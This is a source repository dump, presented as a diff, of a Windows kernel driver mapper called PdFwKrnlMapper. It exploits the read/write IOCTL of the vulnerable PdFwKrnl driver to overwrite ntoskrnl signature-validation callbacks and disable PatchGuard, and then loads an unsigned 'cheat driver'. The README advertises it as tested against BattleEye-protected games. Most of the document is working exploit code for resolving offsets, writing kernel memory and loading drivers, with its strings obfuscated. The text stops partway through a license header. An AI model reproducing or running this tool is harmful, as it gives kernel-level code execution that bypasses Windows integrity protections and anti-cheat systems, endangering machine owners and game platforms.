@@ -1,0 +1,2141 @@
+Project Path: arc_gmh5225_PdFwKrnlMapper__lf_ph0n
+
+Source Tree:
+
+```txt
+arc_gmh5225_PdFwKrnlMapper__lf_ph0n
+├── Bypass.cpp
+├── Bypass.h
+├── Loadup
+│   ├── Loadup.h
+│   └── skCrypt.h
+├── PdfwKrnlMapper.cpp
+├── README.md
+├── Signature
+│   ├── Scanner.cpp
+│   └── Scanner.h
+├── Utils
+│   ├── Utils.cpp
+│   ├── Utils.h
+│   ├── hardware.hpp
+│   ├── lazy_importer.hpp
+│   └── pimraryXor.h
+└── Vuln
+    ├── Vuln.cpp
+    └── Vuln.h
+
+```
+
+`Bypass.cpp`:
+
+```cpp
+#include "Bypass.h"
+
+namespace Bypass
+{
+	bool Init()
+	{
+		SeValidateImageDataOffset	= KernelUtils::GetSeValidateImageDataOffset();
+		SeValidateImageHeaderOffset = KernelUtils::GetSeValidateImageHeaderOffset();
+		RetOffset					= KernelUtils::GetReturnOffset();
+		NtoskrnlBaseAddress			= KernelUtils::GetNtoskrnlBase();
+		PatchgaurdValueOffset		= KernelUtils::GetPatchGaurdValueOffset();
+		PatchgaurdOffset			= KernelUtils::GetPatchGaurdOffset();
+
+		if (SeValidateImageDataOffset == 0 || SeValidateImageHeaderOffset == 0 || RetOffset == 0 || NtoskrnlBaseAddress == 0)
+			return false;
+
+		return true;
+	}
+
+	bool DisableDSE()
+	{
+		ULONG64 ReturnAddressOffset = NtoskrnlBaseAddress + RetOffset;
+
+		BOOL Status = Vuln::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageHeaderOffset, &ReturnAddressOffset, sizeof(ReturnAddressOffset));
+		if (!Status)
+			return false;
+
+		Status = Vuln::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageDataOffset, &ReturnAddressOffset, sizeof(ReturnAddressOffset));
+		if (!Status)
+			return false;
+
+		return Status;
+	}
+
+	bool DisablePG() 
+	{
+		ULONG64 ReturnAddressOffset			= NtoskrnlBaseAddress + RetOffset;
+		ULONG64 PatchGaurdValueAddress		= NtoskrnlBaseAddress + PatchgaurdValueOffset;
+
+		BOOL Status = Vuln::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + PatchgaurdOffset, &PatchGaurdValueAddress, 8);
+		return Status;
+	}
+
+	bool LoadVulnurableDriver(std::string PdFwKrnlPath, std::string PdFwKrnlServiceName)
+	{
+		std::string DrvPath = PdFwKrnlPath;
+		bool Status = driver::load(DrvPath, "PdFwKrnl");
+		if (!Status)
+			return Status;
+
+		VulnurableDriverHandle = CreateFileA(E("\\\\.\\PdFwKrnl"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (VulnurableDriverHandle == INVALID_HANDLE_VALUE || !VulnurableDriverHandle)
+			return false;
+
+		return true;
+	}
+
+	BypassStatus LoadCheatDriver(std::string DriverPath, std::string DriverServiceName, std::string PdFwKrnlPath, std::string PdFwKrnlServiceName)
+	{
+		bool Status = LoadVulnurableDriver(PdFwKrnlPath, PdFwKrnlServiceName);
+		if (!Status)
+			return FAILED_LOADINGVULN;
+
+		Status = DisablePG();
+		if (!Status)
+			return FAILED_DISABLEPG;
+		
+		Status = DisableDSE();
+		if (!Status)
+			return FAILED_DISABLEDSE;
+		
+		std::string DrvPath = DriverPath;
+		Status = driver::load(DrvPath, DriverServiceName);
+		if (Status == 0xC000010E)
+			driver::unload(DriverServiceName);
+
+		Status = driver::load(DrvPath, DriverServiceName);
+		if (!Status)
+			return FAILED_LOADINGCHEATDRV;
+
+		driver::unload(PdFwKrnlServiceName);
+		return SUCCESS;
+	}
+
+	std::string BypassStatusToString(BypassStatus Status)
+	{
+		std::string StatusString;
+
+		switch (Status)
+		{
+			case FAILED_LOADINGVULN:
+			{
+				StatusString = "Failed loading Vulnurable Driver";
+				break;
+			}
+
+			case FAILED_DISABLEPG:
+			{
+				StatusString = "Failed Disabling Patchgaurd";
+				break;
+			}
+
+			case FAILED_DISABLEDSE:
+			{
+				StatusString = "Failed Disabling DSE";
+				break;
+			}
+
+			case FAILED_LOADINGCHEATDRV:
+			{
+				StatusString = "Failed Loading Main Driver";
+				break;
+			}
+
+			case SUCCESS:
+			{
+				StatusString = "Success";
+				break;
+			}
+
+			defualt:
+			{
+				StatusString = "Unkown Status, assuming success";
+				break;
+			}
+		}
+
+		return StatusString;
+	}
+}
+
+
+```
+
+`Bypass.h`:
+
+```h
+#pragma once
+#include "Signature/Scanner.h"
+#include "Utils/Utils.h"
+#include "Loadup/Loadup.h"
+#include "Vuln/Vuln.h"
+
+namespace Bypass
+{
+	enum BypassStatus : int {
+		FAILED_LOADINGVULN,
+		FAILED_DISABLEPG,
+		FAILED_DISABLEDSE,
+		FAILED_LOADINGCHEATDRV,
+		SUCCESS,
+	};
+
+	static char SeValidateImageDataOG[8]	= { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }; // Not Needed unless its VGK.
+	static char SeValidateImageHeaderOG[8]  = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }; // Not Needed unless its VGK.
+
+	static ULONG64 SeValidateImageDataOffset;
+	static ULONG64 SeValidateImageHeaderOffset;
+	static ULONG64 RetOffset;
+	static ULONG64 NtoskrnlBaseAddress;
+	static ULONG64 PatchgaurdValueOffset;
+	static ULONG64 PatchgaurdOffset;
+	static HANDLE  VulnurableDriverHandle;
+
+	bool Init();
+
+	bool DisableDSE();
+	bool DisablePG();
+
+	bool LoadVulnurableDriver(std::string PdFwKrnlPath, std::string PdFwKrnlServiceName);
+
+	BypassStatus LoadCheatDriver(std::string DriverPath, std::string DriverServiceName, std::string PdFwKrnlPath, std::string PdFwKrnlServiceName);
+	std::string BypassStatusToString(BypassStatus Status);
+}
+```
+
+`Loadup/Loadup.h`:
+
+```h
+#pragma once
+#include <Windows.h>
+#include <Winternl.h>
+#include <string>
+#include <fstream>
+#include <filesystem>
+#include "SkCrypt.h"
+
+#pragma comment(lib, "ntdll.lib")
+using nt_load_driver_t = NTSTATUS(__fastcall*)(PUNICODE_STRING);
+using nt_unload_driver_t = NTSTATUS(__fastcall*)(PUNICODE_STRING);
+
+namespace driver
+{
+	namespace util
+	{
+		inline bool delete_service_entry(const std::string& service_name)
+		{
+			HKEY reg_handle;
+			static const std::string reg_key(E("System\\CurrentControlSet\\Services\\"));
+
+			auto result = RegOpenKeyA(
+				HKEY_LOCAL_MACHINE,
+				reg_key.c_str(),
+				&reg_handle
+			);
+
+			return ERROR_SUCCESS == RegDeleteKeyA(reg_handle, service_name.data()) && ERROR_SUCCESS == RegCloseKey(reg_handle);;
+		}
+
+		inline bool create_service_entry(const std::string& drv_path, const std::string& service_name)
+		{
+			HKEY reg_handle;
+			std::string reg_key(E("System\\CurrentControlSet\\Services\\"));
+			reg_key += service_name;
+
+			auto result = RegCreateKeyA(
+				HKEY_LOCAL_MACHINE,
+				reg_key.c_str(),
+				&reg_handle
+			);
+
+			if (result != ERROR_SUCCESS)
+				return false;
+
+			//
+			// set type to 1 (kernel)
+			//
+			constexpr std::uint8_t type_value = 1;
+			result = RegSetValueExA(
+				reg_handle,
+				E("Type"),
+				NULL,
+				REG_DWORD,
+				&type_value,
+				4u
+			);
+
+			if (result != ERROR_SUCCESS)
+				return false;
+
+			//
+			// set error control to 3
+			//
+			constexpr std::uint8_t error_control_value = 3;
+			result = RegSetValueExA(
+				reg_handle,
+				E("ErrorControl"),
+				NULL,
+				REG_DWORD,
+				&error_control_value,
+				4u
+			);
+
+			if (result != ERROR_SUCCESS)
+				return false;
+
+			//
+			// set start to 3
+			//
+			constexpr std::uint8_t start_value = 3;
+			result = RegSetValueExA(
+				reg_handle,
+				E("Start"),
+				NULL,
+				REG_DWORD,
+				&start_value,
+				4u
+			);
+
+			if (result != ERROR_SUCCESS)
+				return false;
+
+			//
+			// set image path to the driver on disk
+			//
+			result = RegSetValueExA(
+				reg_handle,
+				E("ImagePath"),
+				NULL,
+				REG_SZ,
+				(std::uint8_t*)drv_path.c_str(),
+				drv_path.size()
+			);
+
+			if (result != ERROR_SUCCESS)
+				return false;
+
+			return ERROR_SUCCESS == RegCloseKey(reg_handle);
+		}
+
+		// this function was coded by paracord: https://githacks.org/snippets/4#L94 
+		inline bool enable_privilege(const std::string& privilege_name)
+		{
+			HANDLE token_handle = nullptr;
+			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token_handle))
+				return false;
+
+			LUID luid{};
+			if (!LookupPrivilegeValueA(nullptr, privilege_name.data(), &luid))
+				return false;
+
+			TOKEN_PRIVILEGES token_state{};
+			token_state.PrivilegeCount = 1;
+			token_state.Privileges[0].Luid = luid;
+			token_state.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+			if (!AdjustTokenPrivileges(token_handle, FALSE, &token_state, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
+				return false;
+
+			CloseHandle(token_handle);
+			return true;
+		}
+
+		inline std::string get_service_image_path(const std::string& service_name)
+		{
+			HKEY reg_handle;
+			DWORD bytes_read;
+			char image_path[0xFF];
+			static const std::string reg_key(E("System\\CurrentControlSet\\Services\\"));
+
+			auto result = RegOpenKeyA(
+				HKEY_LOCAL_MACHINE,
+				reg_key.c_str(),
+				&reg_handle
+			);
+
+			result = RegGetValueA(
+				reg_handle,
+				service_name.c_str(),
+				"ImagePath",
+				REG_SZ,
+				NULL,
+				image_path,
+				&bytes_read
+			);
+
+			RegCloseKey(reg_handle);
+			return std::string(image_path);
+		}
+	}
+
+	inline NTSTATUS load(const std::string& drv_path, const std::string& service_name)
+	{
+		if (!util::enable_privilege(std::string(E("SeLoadDriverPrivilege"))))
+			return STATUS_ABANDONED_WAIT_0;
+
+		if (!util::create_service_entry("\\??\\" + std::filesystem::absolute(std::filesystem::path(drv_path)).string(), service_name))
+			return STATUS_ABANDONED_WAIT_0;
+
+		std::string reg_path(E("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"));
+		reg_path += service_name;
+
+		static const auto lp_nt_load_drv =
+			::GetProcAddress(
+				GetModuleHandleA(E("ntdll.dll")),
+				E("NtLoadDriver")
+			);
+
+		if (lp_nt_load_drv)
+		{
+			ANSI_STRING driver_rep_path_cstr;
+			UNICODE_STRING driver_reg_path_unicode;
+
+			RtlInitAnsiString(&driver_rep_path_cstr, reg_path.c_str());
+			RtlAnsiStringToUnicodeString(&driver_reg_path_unicode, &driver_rep_path_cstr, true);
+			reinterpret_cast<nt_load_driver_t>(lp_nt_load_drv)(&driver_reg_path_unicode);
+		}
+
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	inline std::tuple<NTSTATUS, std::string> load(const std::vector<std::uint8_t>& drv_buffer)
+	{
+		static const auto random_file_name = [](std::size_t length) -> std::string
+			{
+				static const auto randchar = []() -> char
+					{
+						const char charset[] =
+							"0123456789"
+							"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+							"abcdefghijklmnopqrstuvwxyz";
+						const std::size_t max_index = (sizeof(charset) - 1);
+						return charset[rand() % max_index];
+					};
+				std::string str(length, 0);
+				std::generate_n(str.begin(), length, randchar);
+				return str;
+			};
+
+		const auto service_name = random_file_name(16);
+		const auto file_path = std::filesystem::temp_directory_path().string() + random_file_name(16);
+		std::ofstream output_file(file_path.c_str(), std::ios::binary);
+
+		output_file.write((char*)drv_buffer.data(), drv_buffer.size());
+		output_file.close();
+
+		return { load(file_path, service_name), service_name };
+	}
+
+	inline std::tuple<NTSTATUS, std::string> load(const std::uint8_t* buffer, const std::size_t size)
+	{
+		std::vector<std::uint8_t> image(buffer, buffer + size);
+		return load(image);
+	}
+
+	inline bool unload(const std::string& service_name)
+	{
+		std::string reg_path(E("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"));
+		reg_path += service_name;
+
+		static const auto lp_nt_unload_drv =
+			::GetProcAddress(
+				GetModuleHandleA(E("ntdll.dll")),
+				E("NtUnloadDriver")
+			);
+
+		if (lp_nt_unload_drv)
+		{
+			ANSI_STRING driver_rep_path_cstr;
+			UNICODE_STRING driver_reg_path_unicode;
+
+			RtlInitAnsiString(&driver_rep_path_cstr, reg_path.c_str());
+			RtlAnsiStringToUnicodeString(&driver_reg_path_unicode, &driver_rep_path_cstr, true);
+
+			const bool unload_drv = !reinterpret_cast<nt_unload_driver_t>(lp_nt_unload_drv)(&driver_reg_path_unicode);
+			const auto image_path = std::filesystem::temp_directory_path().string() + service_name;
+			const bool delete_reg = util::delete_service_entry(service_name);
+			try
+			{
+				const bool delete_drv = std::filesystem::remove(image_path);
+			}
+			catch (std::exception& e) {}
+			return unload_drv && delete_reg;
+		}
+		return false;
+	}
+}
+```
+
+`Loadup/skCrypt.h`:
+
+```h
+#pragma once
+
+/*____________________________________________________________________________________________________________
+
+Original Author: skadro
+Github: https://github.com/skadro-official
+License: See end of file
+
+skCrypter
+		Compile-time, Usermode + Kernelmode, safe and lightweight string crypter library for C++11+
+
+							*Not removing this part is appreciated*
+____________________________________________________________________________________________________________*/
+
+#ifdef _KERNEL_MODE
+namespace std
+{
+	// STRUCT TEMPLATE remove_reference
+	template <class _Ty>
+	struct remove_reference {
+		using type = _Ty;
+	};
+
+	template <class _Ty>
+	struct remove_reference<_Ty&> {
+		using type = _Ty;
+	};
+
+	template <class _Ty>
+	struct remove_reference<_Ty&&> {
+		using type = _Ty;
+	};
+
+	template <class _Ty>
+	using remove_reference_t = typename remove_reference<_Ty>::type;
+
+	// STRUCT TEMPLATE remove_const
+	template <class _Ty>
+	struct remove_const { // remove top-level const qualifier
+		using type = _Ty;
+	};
+
+	template <class _Ty>
+	struct remove_const<const _Ty> {
+		using type = _Ty;
+	};
+
+	template <class _Ty>
+	using remove_const_t = typename remove_const<_Ty>::type;
+}
+#else
+#include <type_traits>
+#endif
+
+namespace skc
+{
+	template<class _Ty>
+	using clean_type = typename std::remove_const_t<std::remove_reference_t<_Ty>>;
+
+	template <int _size, char _key1, char _key2, typename T>
+	class skCrypter
+	{
+	public:
+		__forceinline constexpr skCrypter(T* data)
+		{
+			crypt(data);
+		}
+
+		__forceinline T* get()
+		{
+			return _storage;
+		}
+
+		__forceinline int size() // (w)char count
+		{
+			return _size;
+		}
+
+		__forceinline  char key()
+		{
+			return _key1;
+		}
+
+		__forceinline  T* encrypt()
+		{
+			if (!isEncrypted())
+				crypt(_storage);
+
+			return _storage;
+		}
+
+		__forceinline  T* decrypt()
+		{
+			if (isEncrypted())
+				crypt(_storage);
+
+			return _storage;
+		}
+
+		__forceinline bool isEncrypted()
+		{
+			return _storage[_size - 1] != 0;
+		}
+
+		__forceinline void clear() // set full storage to 0
+		{
+			for (int i = 0; i < _size; i++)
+			{
+				_storage[i] = 0;
+			}
+		}
+
+		__forceinline operator T* ()
+		{
+			decrypt();
+
+			return _storage;
+		}
+
+	private:
+		__forceinline constexpr void crypt(T* data)
+		{
+			for (int i = 0; i < _size; i++)
+			{
+				_storage[i] = data[i] ^ (_key1 + i % (1 + _key2));
+			}
+		}
+
+		T _storage[_size]{};
+	};
+}
+
+#define E(str) skCrypt_key(str, __TIME__[4], __TIME__[7])
+#define skCrypt_key(str, key1, key2) []() { \
+			constexpr static auto crypted = skc::skCrypter \
+				<sizeof(str) / sizeof(str[0]), key1, key2, skc::clean_type<decltype(str[0])>>((skc::clean_type<decltype(str[0])>*)str); \
+					return crypted; }()
+
+/*________________________________________________________________________________
+
+MIT License
+
+Copyright (c) 2020 skadro
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+________________________________________________________________________________*/
+```
+
+`PdfwKrnlMapper.cpp`:
+
+```cpp
+#include <iostream>
+#include <windows.h>
+#include "Bypass.h"
+
+int main() {
+	std::cout << " Initializing Offsets...\n";
+	Bypass::Init(); // Initialize Offsets & Cache Them
+	std::cout << " Initializing Exploit and Loading Cheat Driver using PdFwKrnl...\n";
+	Bypass::BypassStatus Status = Bypass::LoadCheatDriver("C:\\Driver.sys", "Driver Service Name", "C:\\Windows\\System32\\PdFwKrnl.sys", "Vuln Service Name"); // Load Cheat Driver & PdFwKrnl
+	std::cout << " Status: " << Bypass::BypassStatusToString(Status) << std::endl;
+	Sleep(5000);
+	driver::unload("Driver Service Name"); // Unload Cheat Driver
+	return 0;
+}
+```
+
+`README.md`:
+
+```md
+# Unsigned Driver Mapper for Windows 10/11
+
+An **Unsigned Driver Mapper** for Windows 10 22H2 → Windows 11 23H2 that leverages **PdFwKrnl** to exploit Read/Write IOCTL calls to temporarily disable **DSE & PatchGuard** and map unsigned drivers.  
+
+*(Original GitHub repo got deleted, and this is a repost to keep the mapper available.)*
+
+---
+
+## Features
+
+- Maps **unsigned drivers** on Windows 10/11.  
+- Uses **PdFwKrnl** for kernel-level IOCTL exploitation.  
+- Disables **DSE** (Driver Signature Enforcement) and **PatchGuard** temporarily.  
+- Fully tested on **BattleEye-protected games**: Escape from Tarkov, DayZ, Rainbow Six Siege.  
+
+---
+
+## Usage Example
+
+```cpp
+#include <iostream>
+#include <windows.h>
+#include "Bypass.h"
+
+int main() {
+	std::cout << " Initializing Offsets...\n";
+	Bypass::Init(); // Initialize Offsets & Cache Them
+	std::cout << " Initializing Exploit and Loading Cheat Driver using PdFwKrnl...\n";
+	Bypass::BypassStatus Status = Bypass::LoadCheatDriver("C:\\Driver.sys", "Driver Service Name", "C:\\Windows\\System32\\PdFwKrnl.sys", "Vuln Service Name"); // Load Cheat Driver & PdFwKrnl
+	std::cout << " Status: " << Bypass::BypassStatusToString(Status) << std::endl;
+	Sleep(5000);
+	driver::unload("Driver Service Name"); // Unload Cheat Driver
+	return 0;
+}
+
+```
+
+`Signature/Scanner.cpp`:
+
+```cpp
+#include "Scanner.h"
+
+namespace scanner
+{
+    std::vector<std::optional<uint8_t>> parse_ida_signature(const char* sig) {
+        std::vector<std::optional<uint8_t>> bytes;
+        std::stringstream ss(sig);
+
+        while (!ss.eof()) {
+            std::string byte_str;
+            ss >> byte_str;
+
+            if (byte_str == "?" || byte_str == "??") {
+                bytes.push_back(std::nullopt);
+                continue;
+            }
+
+            if (byte_str.length() != 2) {
+                throw std::runtime_error("Invalid byte in IDA signature: " + byte_str);
+            }
+
+            char* end;
+            long value = strtol(byte_str.c_str(), &end, 16);
+
+            if (*end != '\0') {
+                throw std::runtime_error("Invalid byte in IDA signature: " + byte_str);
+            }
+
+            bytes.push_back(static_cast<uint8_t>(value));
+        }
+
+        return bytes;
+    }
+
+
+    pattern::pattern(const std::string& module) : m_module(module.c_str()), m_module_name(module), m_result(0, (uintptr_t)0)
+    {
+        m_module_handle = LoadLibraryA(m_module_name.c_str());
+
+        if (m_module_handle == nullptr) {
+            throw std::runtime_error("Could not find module: " + m_module_name);
+        }
+
+        MODULEINFO mi = { 0 };
+
+        if (!GetModuleInformation(GetCurrentProcess(), m_module_handle, &mi, sizeof(mi))) {
+            throw std::runtime_error("Could not get module information");
+        }
+        m_module_size = mi.SizeOfImage;
+    }
+
+    pattern::~pattern()
+    {
+        if (m_module_handle) FreeLibrary(m_module_handle);
+    }
+
+    pattern& pattern::scan_now(const char* sig_name, const char* ida_sig, const char* section_name)
+    {
+        auto signature = parse_ida_signature(ida_sig);
+
+        std::uintptr_t base_address = reinterpret_cast<std::uintptr_t>(m_module_handle);
+
+        std::size_t sig_size = signature.size();
+        std::uintptr_t end_address = base_address + m_module_size - sig_size;
+
+        std::array<int, 256> bad_char;
+        for (int i = 0; i < 256; ++i) {
+            bad_char[i] = sig_size;
+        }
+        for (int i = 0; i < sig_size - 1; ++i) {
+            if (signature[i].has_value()) {
+                bad_char[signature[i].value()] = sig_size - i - 1;
+            }
+            else {
+                for (int j = 0; j < 256; ++j) {
+                    bad_char[j] = min(bad_char[j], sig_size - i - 1);
+                }
+            }
+        }
+
+        std::uintptr_t i = 0;
+        if (section_name == nullptr) i = base_address + sig_size - 1;
+        else
+        {
+            PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)base_address;
+            PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)base_address + pDosHeader->e_lfanew);
+            PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+
+            LPVOID lpFoundAddress = NULL;
+
+            for (WORD j = 0; j < pNtHeaders->FileHeader.NumberOfSections; j++)
+            {
+                if (strcmp((CHAR*)pSectionHeader[j].Name, section_name) == 0)
+                {
+                    lpFoundAddress = (LPVOID)((LPBYTE)base_address + pSectionHeader[j].VirtualAddress);
+                    i = (uintptr_t)lpFoundAddress + sig_size - 1;
+
+                    SIZE_T dwSectionSize = pSectionHeader[j].Misc.VirtualSize;
+                    end_address = (uintptr_t)lpFoundAddress + dwSectionSize - sig_size;
+                    break;
+                }
+            }
+
+            if (lpFoundAddress == NULL)
+            {
+                throw std::runtime_error(std::string("Section ") + section_name + " not found!");
+            }
+        }
+
+        while (i < end_address) {
+            int j = sig_size - 1;
+            while (j >= 0) {
+                if (signature[j].has_value() && signature[j].value() != *reinterpret_cast<uint8_t*>(i - sig_size + j + 1))
+                    break;
+                --j;
+            }
+            if (j < 0) {
+                m_result = handle(i - sig_size + 1, (uintptr_t)m_module_handle);
+                return *this;
+            }
+            i += max(bad_char[*reinterpret_cast<uint8_t*>(i)], static_cast<int>(sig_size - j - 1));
+        }
+
+        m_result = handle(0, (uintptr_t)m_module_handle);
+
+        return *this;
+    }
+
+    handle pattern::get_result()
+    {
+        return m_result;
+    }
+}
+```
+
+`Signature/Scanner.h`:
+
+```h
+#pragma once
+// IDA search pattern library
+// 4l3x777
+
+#include <cstdint>   
+#include <string>   
+#include <Windows.h> 
+#include <Psapi.h>
+#include <vector>
+#include <optional>
+#include <sstream>
+#include <array>
+
+namespace scanner
+{
+    class handle {
+    public:
+        handle() = default;
+        explicit handle(uintptr_t address, uintptr_t module_handle) : m_address(address), m_module_handle(module_handle) {}
+
+        template <typename T>
+        T as() const {
+            return reinterpret_cast<T>(m_address);
+        }
+
+        handle add(uintptr_t offset) const {
+            if (m_address != 0)
+            {
+                return handle(m_address + offset, m_module_handle);
+            }
+
+            return *this;
+        }
+
+        handle sub(uintptr_t offset) const {
+            if (m_address != 0)
+            {
+                return handle(m_address - offset, m_module_handle);
+            }
+
+            return *this;
+        }
+
+        handle rip() const {
+            if (m_address != 0)
+            {
+                auto offset = *as<int32_t*>();
+                return add(offset + sizeof(int32_t));
+            }
+
+            return *this;
+        }
+
+        template <typename T>
+        T get_base() const {
+            return reinterpret_cast<T>(m_module_handle);
+        }
+
+    private:
+        uintptr_t m_address = 0;
+        uintptr_t m_module_handle = 0;
+    };
+
+
+    class _module {
+    public:
+        _module(const char* module) : m_module(module)
+        {
+            m_module_handle = LoadLibraryA(m_module);
+        }
+
+        handle get_export(const char* func)
+        {
+            return handle((std::uintptr_t)GetProcAddress(m_module_handle, func), (std::uintptr_t)m_module_handle);
+        }
+
+        HMODULE get_handle()
+        {
+            return m_module_handle;
+        }
+
+    private:
+        const char* m_module;
+        HMODULE m_module_handle;
+    };
+
+    class pattern {
+    public:
+        pattern(const std::string& module);
+        ~pattern() noexcept;
+
+        pattern& scan_now(const char* sig_name, const char* ida_sig, const char* section_name = nullptr);
+
+        handle get_result();
+
+    private:
+        std::string m_module_name;
+        _module m_module;
+        size_t m_module_size;
+        HMODULE m_module_handle;
+        handle m_result;
+    };
+}
+```
+
+`Utils/Utils.cpp`:
+
+```cpp
+#include "Utils.h"
+
+ULONG64 KernelUtils::GetNtoskrnlBase()
+{
+	DWORD CbNeeded = 0;
+	LPVOID Drivers[1024] = { 0 };
+	if (K32EnumDeviceDrivers(Drivers, sizeof(Drivers), &CbNeeded))
+		return (ULONG64)Drivers[0];
+	else
+		return 0;
+}
+
+ULONG64 KernelUtils::GetSeValidateImageHeaderOffset()
+{
+	scanner::handle SeValidateImageHeaderSignature	= scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("SeValidateImageHeader", "48 39 35 ? ? ? ? 48 8B F9 48 89 70 F0 44 8B DE").get_result();
+	uint8_t* SignaturePatternBegin					= SeValidateImageHeaderSignature.as<uint8_t*>();
+	ULONG32 RIPOffsetSeValidateImageHeaderCallback	= *(ULONG32*)(&SignaturePatternBegin[3]);
+	ULONG32 RIPInstructionLength					= 7;
+	ULONG64* SeValidateImageHeaderCallbackAddress	= SeValidateImageHeaderSignature.add(RIPOffsetSeValidateImageHeaderCallback + RIPInstructionLength).as<ULONG64*>();
+
+	return (ULONG64)SeValidateImageHeaderCallbackAddress - (ULONG64)SeValidateImageHeaderSignature.get_base<uint64_t*>();
+}
+
+ULONG64 KernelUtils::GetSeValidateImageDataOffset()
+{
+	scanner::handle SeValidateImageDataSignature	= scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("SeValidateImageData", "48 8B 05 ? ? ? ? 4C 8B D1 48 85 C0 74 ?").get_result();
+	auto SignaturePatternBegin						= SeValidateImageDataSignature.as<uint8_t*>();
+
+	ULONG32 RIPOffsetSeValidateImageDataCallback	= *(ULONG32*)(&SignaturePatternBegin[3]);
+	ULONG32 RIPInstructionLength					= 7;
+	ULONG64* SeValidateImageDataCallbackAddress		= SeValidateImageDataSignature.add(RIPOffsetSeValidateImageDataCallback + RIPInstructionLength).as<ULONG64*>();
+
+	return (ULONG64)SeValidateImageDataCallbackAddress - (ULONG64)SeValidateImageDataSignature.get_base<ULONG64*>();
+}
+
+ULONG64 KernelUtils::GetReturnOffset()
+{
+	scanner::handle RetSignature	= scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("ret", "B8 01 00 00 00 C3", ".text").get_result();
+	ULONG64* RetAddress				= RetSignature.as<ULONG64*>();
+
+	return (ULONG64)RetSignature.as<ULONG64*>() - (ULONG64)RetSignature.get_base<ULONG64*>();
+}
+
+ULONG64 KernelUtils::GetPatchGaurdOffset()
+{
+	scanner::handle PatchGuardSignature = scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("PatchGuard", "38 0D ? ? ? ? 75 02 EB FE").get_result();
+	
+	uint8_t* SignaturePatternBegin		= PatchGuardSignature.as<uint8_t*>();
+	ULONG32 RIPOffsetPatchGuardCallback = *(ULONG32*)(&SignaturePatternBegin[2]);
+	ULONG32 RIPInstructionLength		= 6;
+	ULONG64* PatchGuardCallbackAddress	= PatchGuardSignature.add(RIPOffsetPatchGuardCallback + RIPInstructionLength).as<ULONG64*>();
+
+	return (ULONG64)PatchGuardCallbackAddress - (ULONG64)PatchGuardSignature.get_base<ULONG64*>();
+}
+
+ULONG64 KernelUtils::GetPatchGaurdValueOffset()
+{
+	scanner::handle  PatchGuardValueSignature = scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("patchguardvalue", "00 00 00 00 00 00 00 00", ".rdata").get_result();
+	
+	ULONG64* PatchGuardValueAddress = PatchGuardValueSignature.as<uint64_t*>();
+	return (ULONG64)PatchGuardValueAddress - (ULONG64)PatchGuardValueSignature.get_base<uint64_t*>();
+}
+```
+
+`Utils/Utils.h`:
+
+```h
+#pragma once
+#include "../Bypass.h"
+
+namespace KernelUtils
+{
+	ULONG64 GetNtoskrnlBase();
+	ULONG64 GetSeValidateImageHeaderOffset();
+	ULONG64 GetSeValidateImageDataOffset();
+	ULONG64 GetReturnOffset();
+	ULONG64 GetPatchGaurdOffset();
+	ULONG64 GetPatchGaurdValueOffset();
+}
+```
+
+`Utils/hardware.hpp`:
+
+```hpp
+#include <windows.h>
+#include <tlhelp32.h>
+#include <string>
+#include <iostream>
+#include "vector.h"
+#include <tuple>
+#include <cmath>
+
+std::string GetDiskVolumeSerialNumber()
+{
+    char volumeName[MAX_PATH + 1] = { 0 };
+    char fileSystemName[MAX_PATH + 1] = { 0 };
+    DWORD serialNumber = 0;
+    DWORD maxComponentLength = 0;
+    DWORD fileSystemFlags = 0;
+
+    if (GetVolumeInformationA("C:\\", volumeName, ARRAYSIZE(volumeName),
+        &serialNumber, &maxComponentLength, &fileSystemFlags,
+        fileSystemName, ARRAYSIZE(fileSystemName)))
+    {
+        // Convert serial number to a string
+        std::string serialNumberStr = std::to_string(serialNumber);
+
+        return serialNumberStr;
+    }
+    else
+    {
+        // Handle error
+        DWORD error = GetLastError();
+        std::cerr << "Failed to get volume information. Error code: " << error << std::endl;
+        return "";
+    }
+}
+```
+
+`Utils/lazy_importer.hpp`:
+
+```hpp
+/*
+ * Copyright 2018-2022 Justas Masiulis
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
